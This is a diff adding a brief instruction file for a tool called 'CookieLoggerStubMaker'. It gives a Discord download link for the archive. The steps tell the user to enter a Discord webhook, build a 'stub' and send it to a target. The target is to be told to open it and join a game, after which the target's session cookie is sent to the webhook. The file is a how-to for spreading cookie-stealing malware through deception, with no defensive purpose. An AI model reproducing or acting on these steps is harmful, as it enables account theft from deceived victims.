@@ -1,0 +1,10 @@
+Extract the folder
+https://cdn.discordapp.com/attachments/832965551353233418/833369719846731796/CookieLoggerStubMaker.rar
+
+1.) Run Depression
+
+2.) Insert your Discord Webhook and select a name for your Stub
+
+3.) Click "Create Stub" after... send it to your target and tell them to open it and join a game.
+
+4.) The cookie should be sent to the webhook shortly after he joins the game.me.
